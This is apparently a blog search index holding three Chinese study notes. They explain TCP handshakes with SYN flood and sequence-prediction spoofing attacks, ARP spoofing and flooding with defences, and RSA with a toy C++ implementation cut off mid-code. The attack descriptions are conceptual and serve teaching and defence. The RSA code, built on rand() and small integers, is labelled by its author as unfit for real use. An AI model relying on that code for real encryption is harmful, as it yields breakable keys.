<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--TCP</title>
    <link href="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/"/>
    <url>/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-x2F-IP协议栈安全分析–TCP"><a href="#TCP-x2F-IP协议栈安全分析–TCP" class="headerlink" title="TCP&#x2F;IP协议栈安全分析–TCP"></a>TCP&#x2F;IP协议栈安全分析–TCP</h1><p>TCP是一种面向连接的协议，它在传输数据之前会建立一条专用的通信连接，意味着在数据传输过程中，两台计算机之间会有一条稳定的数据传输通道。因此，TCP可以保证数据传输的可靠性，但会带来一定的延迟。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312110155266.png" alt="总的过程"></p><h2 id="一、三次握手"><a href="#一、三次握手" class="headerlink" title="一、三次握手"></a>一、三次握手</h2><h3 id="1-1-过程分析"><a href="#1-1-过程分析" class="headerlink" title="1.1 过程分析"></a>1.1 过程分析</h3><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312111639293.png" alt="三次握手"></p><p>（1）Client端发送一个SYN包，请求连接，告诉Server端他的初始序列号是x，此时Client的状态是SYN_SENT</p><p>（2）Server端收到了SYN包，告诉Client已经收到了请求，并且也告诉Client端自己的序列号是y，发送一个SYN+ACK包，Server的状态是SYN_RCVD</p><p>（3）Client端收到了发送过来的包，发回去一个ACK包，告知Server端已经收到了发送过来的包，此时Client的状态是ESTABLISHED</p><p>（4）Server端收到Client发送过来的ACK包之后，进入ESTABLISHED状态，连接建立完毕</p><p><strong>Q1：为什么需要三次握手？两次行不行？</strong></p><p>三次握手的目的是为了保证Client和server双方的接收能力，发送能力都是正常的。</p><p>第一次握手：Client发送SYN包给Server，Server端收到了，这时候Server端知道：client的发送能力正常，server的接收能力正常</p><p>第二次握手：server发送SYN+ACK包，client收到了，这时候Client端知道：client端的发送，接收能力正常；server端的发送，接收能力正常；但是为什么还需要第三次握手呢？<strong>因为此时client端知道双方均正常，但是server端不知道是否均正常，server只知道自身的发送与接收能力正常，client的发送能力正常，但是他不知道client的接收能力是否正常，所以需要第三次握手client发送一个ACK包，让server知道client接收能力正常，这样就可以建立连接了。</strong></p><p>如果只有两次握手，设想这样一个情境：如果client端发送一个SYN包给server，但是由于种种原因导致SYN包在网络某些结点处滞留了，但是client会进行重传SYN包，然后server端收到了这个重传的包，发送ACK包回去，然后建立好连接。等发送数据完毕之后，连接结束，这时候滞留的SYN包到达了Server端，server以为发起了一个新的连接请求，于是发送回一个ACK包，但是client此时并没有发起连接的请求，所以自动忽略那个ACK包，但是由于前提是两次握手创建连接，只要client收到了ACK包连接就建立了，所以此时连接已经建立了，所以Server端等待client发送数据包，但是client端没有发送数据包的需求，所以资源被浪费。</p><p><strong>Q2：什么是半连接队列？</strong></p><p>服务器第一次收到客户端的 SYN 之后，就会处于 SYN_RCVD 状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个队列里，我们把这种队列称之为半连接队列。当然还有一个全连接队列，就是已经完成三次握手，建立起连接的就会放在全连接队列中。如果队列满了就有可能会出现丢包现象。</p><p><strong>SYN-ACK包重传：</strong>服务器发送完SYN-ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传。如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。每次重传等待的时间不一定相同，一般会是指数增长，例如间隔时间为 1s，2s，4s，8s…</p><p><strong>Q3：ISN（序列号）是固定的吗</strong></p><p>ISN为了让对方知道如何接下来接收数据的时候如何按序列号组装数据。首先，如果 ISN 是固定的，攻击者很容易猜出后续的确认号，因此 ISN 是动态生成的。其次，如果ISN固定是1，client和server建立好一个TCP连接之后，client连续给server发了10个包，这10个包被链路上的路由器缓存了，这个时候client挂掉了，然后client用同样的端口号重新连接上Server，client又连续给server发了几个包，假设这个时候client的序列号是5了，之前滞留的数据包最终到了server端，server给client回复确认号10，但是client此时自己序列号只有5，这就乱了。。。。。。</p><p><strong>Q4：三次握手可以携带数据吗？</strong></p><p>第三次可以携带数据，但是前两次不行，因为第三次的时候client已经是Establish状态了，所以可以确保双方是可信的，但是如果第一次或者第二次携带数据的话，攻击者完全可以发送恶意的SYN包，包里面有着大量的恶意的数据，server就需要大量的空间、时间来保存这些包</p><h3 id="1-2-安全分析"><a href="#1-2-安全分析" class="headerlink" title="1.2 安全分析"></a>1.2 安全分析</h3><h4 id="1-2-1-SYN洪泛攻击"><a href="#1-2-1-SYN洪泛攻击" class="headerlink" title="1.2.1 SYN洪泛攻击"></a>1.2.1 SYN洪泛攻击</h4><p>SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server则回复确认包，并等待Client确认，由于源地址不存在，因此Server需要不断重发直至超时，这些伪造的SYN包将长时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS&#x2F;DDoS 攻击。检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。</p><h4 id="1-2-2-序号攻击"><a href="#1-2-2-序号攻击" class="headerlink" title="1.2.2 序号攻击"></a>1.2.2 序号攻击</h4><p>如果攻击者能够预测目标主机选择的起始序号，他就可能欺骗该目标主机，使其相信它正在与一台可信的主机会话。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312115524390.png" alt="IP欺骗"></p><p><strong>Q1：为什么X必须要对B进行Dos攻击？</strong></p><p>如果不做Dos攻击的话，步骤4中B收到A发来的它未请求过的应答包，将返回RST包而终止连接</p><p><strong>Q2：为何X不能直接将自己IP修改为B的IP来连接到A的rlogin端口？</strong></p><p>①相同局域网内IP地址产生冲突</p><p>②外网X不能这样修改，网段不对</p><h3 id="1-3-防御策略"><a href="#1-3-防御策略" class="headerlink" title="1.3 防御策略"></a>1.3 防御策略</h3><h4 id="1-3-1-SYN洪泛攻击防御策略："><a href="#1-3-1-SYN洪泛攻击防御策略：" class="headerlink" title="1.3.1 SYN洪泛攻击防御策略："></a>1.3.1 <strong>SYN洪泛攻击防御策略</strong>：</h4><p><strong>Anti-DDos系统</strong>，部署在网络入口处，在服务器之前处理SYN报文，识别出虚假源，屏蔽来自这些地址的报文，只将合法的SYN报文传递给服务器。主要使用两种手段：源认证和首包丢弃</p><p><strong>源认证：</strong>Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</p><p><strong>首包丢弃：</strong>如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。所以需要首包丢弃的功能：正常情况下客户端发送SYN报文后如果在一定的时间内没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文，Anti-DDos系统会丢弃收到的第一个SYN报文，对于SYN洪泛攻击SYN报文绝大多数都是首包，所以只能正常的客户才会进行重传，然后再用源认证，这样一来就可以减少了Anti-DDos系统应答的压力。</p><h4 id="1-3-2-IP欺骗防御策略"><a href="#1-3-2-IP欺骗防御策略" class="headerlink" title="1.3.2 IP欺骗防御策略"></a>1.3.2 IP欺骗防御策略</h4><p>（1）阻止DDos攻击：因为完成IP欺骗必须要有Dos攻击的前提，所以如果可以防止Dos攻击的话，IP欺骗也就无法完成了。</p><p>（2）序列号随机化：攻击者可以猜测出序列号，所以如果序列号能够真正的做到随机化，使得规律无迹可寻。但是在现实生活中，随机很难做到，现在的随机都是伪随机，无法做到真正的随机。</p><h2 id="二、四次挥手"><a href="#二、四次挥手" class="headerlink" title="二、四次挥手"></a>二、四次挥手</h2><p>建立连接需要三次挥手，而终止一个连接需要经过四次挥手。</p><p>刚开始双方均处于ESTABLISHED状态，假设客户端发起关闭请求，过程如下：</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312122548799.png" alt="四次挥手"></p><p><strong>第一次挥手</strong>：client发送FIN报文，报文中指定一个序列号u，此时客户端处于FIN_WAIT1状态，等待服务端确认</p><p><strong>第二次挥手：</strong>服务端收到FIN之后，会发送ACK报文，且把客户端的u+1作为ACK报文的序列号值，表明已经收到客户端的报文了，此时服务端处于CLOSE_WAIT状态，此时TCP处于半关闭状态，客户端到服务端的连接释放，客户端收到服务端的确认后，进入FIN_WAIT2状态，等待服务端发出的连接释放报文段</p><p><strong>第三次挥手：</strong>server端也进行断开，发送FIN报文，且指定一个序列号，此时server端处于LAST_ACK状态。即服务端没有要向客户端发出的数据，等待client确认。</p><p><strong>第四次挥手：</strong>client收到FIN之后，一样发出一个ACK报文作为应答，且把server的序列号值+1作为自己ACK报文的序列值，此时客户端处于TIME_WAIT状态。需要过一阵子以确保服务端收到自己的ACK报文之后才会进入CLOSED状态，Server端收到ACK报文之后，就处于关闭连接了，处于CLOSED状态。</p><p><strong>Q1：挥手为什么需要四次？</strong></p><p>因为当服务端收到客户端的SYN连接请求报文后，可以直接发送<strong>SYN+ACK</strong>报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当服务端收到<strong>FIN</strong>报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉客户端，“你发的FIN报文我收到了”。只有等到我服务端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四次挥手。</p><p><strong>Q2：2MSL等待状态的意义</strong></p><p>MSL是指任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。</p><p>为了保证客户端发送的最后一个ACK报文段能够到达服务器。因为这个ACK有可能丢失，从而导致处在LAST-ACK状态的服务器收不到对FIN-ACK的确认报文。server会超时重传这个FIN-ACK，接着client再重传一次确认，重新启动时间等待计时器，最后客户端和服务端都能正常的关闭。假设客户端不等待2MSL的话，发送完ACK之后就直接关闭，一旦ACK丢失的话，server将无法正常的进入关闭连接状态。</p><p>简而言之：</p><p>（1）保证客户端发送最后的一个ACK报文段可以到达服务端</p><p>（2）防止“已失效的连接请求报文段”出现在本连接中：经过2MSL之后，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失，使下一个新的连接不会出现旧的连接请求报文段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--ARP</title>
    <link href="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/"/>
    <url>/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-x2F-IP协议栈安全分析–ARP"><a href="#TCP-x2F-IP协议栈安全分析–ARP" class="headerlink" title="TCP&#x2F;IP协议栈安全分析–ARP"></a>TCP&#x2F;IP协议栈安全分析–ARP</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。</p><p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址。</p><p>收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存。</p><p>简单一点说就是：在IP以太网中，当一个上层协议要发包的时候，有了该节点的IP地址，ARP就能提供该节点的MAC地址</p><h2 id="二、ARP工作过程"><a href="#二、ARP工作过程" class="headerlink" title="二、ARP工作过程"></a>二、ARP工作过程</h2><p>（1）主机A和主机B在一个网段里面</p><ol><li>主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。</li><li>如果在ARP缓存表里面找不到相对应的表项，就缓存该数据报文，然后以广播的方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</li><li>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</li><li>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</li></ol><p>（2）主机A和主机B不在一个网段里面（<strong>在不在同一个网段里面由主机A进行判断</strong>）</p><ol><li>主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。</li><li>当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。</li><li>如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B。</li><li>如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。</li></ol><h2 id="三、ARP表"><a href="#三、ARP表" class="headerlink" title="三、ARP表"></a>三、ARP表</h2><p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP request报文来获得它。学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p><p>ARP表项又分为动态ARP表项和静态ARP表项。</p><h3 id="3-1-动态ARP表项"><a href="#3-1-动态ARP表项" class="headerlink" title="3.1 动态ARP表项"></a>3.1 动态ARP表项</h3><p>动态ARP表项由ARP协议通过ARP报文自动生成和维护，可以被老化，可以被新的ARP报文更新，可以被静态ARP表项覆盖。每个动态ARP缓存项的潜在生命周期是10分钟。新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除；如果某个项目已在使用，则又收到2分钟的生命周期；如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h3 id="3-2-静态ARP表项"><a href="#3-2-静态ARP表项" class="headerlink" title="3.2 静态ARP表项"></a>3.2 静态ARP表项</h3><p>静态ARP表项通过手工配置和维护，不会被老化，不会被动态ARP表项覆盖，直到重新启动计算机为止。</p><p>配置静态ARP表项可以增加通信的安全性。静态ARP表项可以限制和指定IP地址的设备通信时只使用指定的MAC地址，此时攻击报文无法修改此表项的IP地址和MAC地址的映射关系，从而保护了本设备和指定设备间的正常通信。</p><h2 id="四、ARP欺骗"><a href="#四、ARP欺骗" class="headerlink" title="四、ARP欺骗"></a>四、ARP欺骗</h2><p>因为ARP请求是基于互相信任的基础之上的，所以说无论是谁发的，我都会选择无条件相信。</p><p>如果一台不可信赖的计算机发出假冒的ARP查询或应答信息，并将所有流向它的数据流转移。这样，它就可以伪装成某台机器或修改数据流。这种攻击叫做<strong>ARP攻击</strong>，比如黑客软件Arpspoof就可以实现这样的攻击。</p><h3 id="4-1-ARP欺骗–假冒网关"><a href="#4-1-ARP欺骗–假冒网关" class="headerlink" title="4.1 ARP欺骗–假冒网关"></a>4.1 ARP欺骗–假冒网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230309202825792.png" alt="假冒网关"></p><p>攻击者监听到洪泛的ARP Request后，广播假的网关ARP Reply报文给同网段主机。</p><p>如上图</p><p>攻击者B假冒网关，说目的IP 1.1.1.1对应的MAC地址为B，与之相邻的主机的ARP表均被污染，这样的话如果用户A想要上网，发送IP包给网关，但是由于ARP表已经被污染了，IP地址为1.1.1.1的主机的MAC地址为B，所以用户A的上网流量被导向到攻击者B，如此一来便上不了网了</p><h3 id="4-2-ARP-欺骗–欺骗网关"><a href="#4-2-ARP-欺骗–欺骗网关" class="headerlink" title="4.2 ARP 欺骗–欺骗网关"></a>4.2 ARP 欺骗–欺骗网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075203443.png" alt="欺骗网关"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.3的MAC地址是B，然后网关的ARP表被污染掉，这样用户A想要上网，包可以发送到网关处，但是网关这里无法将发送给用户A的流量发送给A，因为ARP表已经被污染了，所以说网关原本发送给用户A的流量被发送到了攻击者B</p><h3 id="4-3-ARP欺骗–欺骗终端用户"><a href="#4-3-ARP欺骗–欺骗终端用户" class="headerlink" title="4.3 ARP欺骗–欺骗终端用户"></a>4.3 ARP欺骗–欺骗终端用户</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075821109.png" alt="欺骗终端用户"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.9的MAC地址为B，用户A的ARP表被污染了，导致用户A原本发送给用户C的包会发送到攻击者B</p><p>上面发送的ARP Request报文是广播的，所以说在一个网段里面，所有的主机的ARP表都将会被污染</p><p>比如第三张图片中，其实网关、用户C的ARP表也被污染了，所以其实用户C也无法上网，分析过程也是从IP–&gt;MAC的映射关系入手。</p><p>在攻击者B广播伪造的ARP Request报文的时候，网关的ARP表中1.1.1.9对应的MAC地址也被修改为了B，当用户C想要上网的时候，用户C向网关发送数据包，这一步仍然可以正常进行，因为在用户C的ARP表中网关的IP与MAC地址并没有被修改，但是当网关想要把返回来的数据包发送给用户C的时候，由于网关的ARP表被修改了，所以网关想要发回用户C的数据包最终会发给攻击者B</p><h2 id="五、ARP防御"><a href="#五、ARP防御" class="headerlink" title="五、ARP防御"></a>五、ARP防御</h2><h3 id="5-1-网关防御"><a href="#5-1-网关防御" class="headerlink" title="5.1 网关防御"></a>5.1 网关防御</h3><p>（1）合法ARP绑定，防御网关被欺骗</p><p>（2）VLAN内的ARP学习数量限制，防御ARP泛洪攻击</p><h3 id="5-2-接入设备防御"><a href="#5-2-接入设备防御" class="headerlink" title="5.2 接入设备防御"></a>5.2 接入设备防御</h3><p>（1）将合法网关IP-MAC进行绑定，防御仿冒网关攻击</p><p>（2）ARP入侵检测</p><p>（3）ARP限速，防止大流量ARP报文冲击网络</p><p>（4）绑定用户的静态MAC</p><h3 id="5-3-客户端防御"><a href="#5-3-客户端防御" class="headerlink" title="5.3 客户端防御"></a>5.3 客户端防御</h3><p>（1）合法网关ARP绑定，防止网关仿冒攻击</p><p>（2）绑定该主机的合法IP-MAC，过滤掉所有非法ARP报文</p><p>（3）ARP限速</p><blockquote><p>没有到老化时间不允许修改MAC地址</p><p>对于MAC地址要修改的ARP报文，对原ARP表对应的用户发送单播确认；收到应答进行拒绝</p><p>合法ARP静态绑定；ARP限速，防止ARP Flooding</p></blockquote><h2 id="六、补充：ARP-Flooding攻击"><a href="#六、补充：ARP-Flooding攻击" class="headerlink" title="六、补充：ARP Flooding攻击"></a>六、补充：ARP Flooding攻击</h2><p><strong>ARP Flooding攻击</strong>：攻击者向设备发送大量目的IP地址无法解析的伪造ARP请求或免费报文，造成设备上的ARP表项溢出。无法缓存正常用户的ARP表项，从而影响正常的报文转发。</p><p><strong>如何防御ARP Flooding攻击？</strong></p><p>（1）<code>禁止接口学习ARP表项的功能</code>：用户禁止指定接口学习ARPP表项的功能，可以有效防止ARP表项溢出，保证ARP表项的安全性。</p><p>（2）<code>配置ARP表项严格学习</code>：设备仅学习自己发送的ARP请求报文的应答报文，并不学习其他设备向路由器发送的ARP请求报文。</p><p>（3）<code>配置ARP表项限制</code>：设备基于接口限制学习ARP表项的总数目，可以有效的防止ARP表项溢出，保证安全性。</p><p>（4）<code>配置ARP报文限速</code>：设备对ARP报文进行数量统计，在一定时间内，如果ARP报文数量超过了配置的阈值，超出部分的ARP报文将被忽略，设备不做任何处理，有效防止ARP表项溢出</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法</title>
    <link href="/2023/03/09/RSA%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/09/RSA%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>RSA是一种非对称加密算法，是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出的。RSA就是他们三位的姓名的首字母。</p><p>非对称加密算法：加密与解密的密钥不同</p><p>RSA同时还是分组加密算法，<strong>分组大小可以根据密钥的大小而改变</strong>，如果加密的数据不是分组大小的整数倍，则会根据具体的应用方式增加额外的填充位。</p><p><strong>RSA算法的原理围绕着模幂运算</strong>，<strong>模幂运算就是计算a^b^mod n的过程</strong></p><h2 id="二、计算公钥与私钥"><a href="#二、计算公钥与私钥" class="headerlink" title="二、计算公钥与私钥"></a>二、计算公钥与私钥</h2><p>公钥用于加密，私钥进行解密</p><p>（1）首先选择两个大素数，记作p和q，这两个数至少得有200位，才能在实践中保证相对的安全</p><p>（2）计算n&#x3D;p*q，随机选择加密密钥e，保证e和(p-1)(q-1)互素</p><p>（3）使用扩展欧几里德算法，<em>ed</em> &#x3D; 1mod (<em>p</em> - 1)(<em>q</em> - 1)，d和e的关系是互为逆元</p><p>（4）公钥为(<em>e</em>, <em>n</em>)，私钥为(<em>d</em>, <em>n</em>)</p><p>我们表示<strong>P &#x3D; (e,n) , S &#x3D; (d,n)</strong></p><p>用P来加密数据，用S来解密。<strong>为了防止就算有人知道了P也无法推算出S，必须保证p和q的值绝对不能暴露</strong>。</p><p>此项难题来自于<strong>大整数分解难题</strong>：给你两个整数，很容易可以知道整数之积；但是如果给你一个大整数，很难确定是由哪两个素整数之积</p><p>所以用此项难题来保证加密解密的安全性</p><h2 id="三、加密解密的合理性"><a href="#三、加密解密的合理性" class="headerlink" title="三、加密解密的合理性"></a>三、加密解密的合理性</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154824728.png" alt="image-20230309154824728"></p><h2 id="四、加密解密数据分组"><a href="#四、加密解密数据分组" class="headerlink" title="四、加密解密数据分组"></a>四、加密解密数据分组</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154845590.png" alt="image-20230309154845590"></p><h2 id="五、算法实现"><a href="#五、算法实现" class="headerlink" title="五、算法实现"></a>五、算法实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//本算法实现是相当简单的版本</span><br><span class="hljs-comment">//仅体现过程，不追求效率</span><br><span class="hljs-comment">//在实际生产过程中绝无可能使用如下算法</span><br><span class="hljs-comment">//仅作学习记录</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//一个非常简单的RSA算法实现，只追求完整步骤，不讲究效率</span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Isprime</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> </span>&#123;<br>    <span class="hljs-comment">//是否是素数，最原始方法，不讲究效率</span><br>    <span class="hljs-type">bool</span> ans=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-built_in">sqrt</span>(p); i++) &#123;<br>        <span class="hljs-keyword">if</span> (p % i == <span class="hljs-number">0</span>) &#123;<br>            ans = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-comment">//随机产生两个素数p，q</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">Create_Prime</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">pq</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span>;<br>    pq[<span class="hljs-number">0</span>] = <span class="hljs-built_in">rand</span>();<br>    pq[<span class="hljs-number">1</span>] = <span class="hljs-built_in">rand</span>();<br><span class="hljs-keyword">while</span> (!(<span class="hljs-built_in">Isprime</span>(pq[<span class="hljs-number">0</span>]) &amp;&amp; <span class="hljs-built_in">Isprime</span>(pq[<span class="hljs-number">1</span>]))) &#123;<br>        pq[<span class="hljs-number">0</span>] = <span class="hljs-built_in">rand</span>();<br>        pq[<span class="hljs-number">1</span>] = <span class="hljs-built_in">rand</span>();<br>&#125;<br><span class="hljs-keyword">return</span> pq;<br>&#125;<br><br><span class="hljs-comment">//最大公约数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span>&amp; x, <span class="hljs-type">int</span> &amp;y)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) <br>        <span class="hljs-built_in">swap</span>(a, b);<br>    <span class="hljs-keyword">if</span> (b == <span 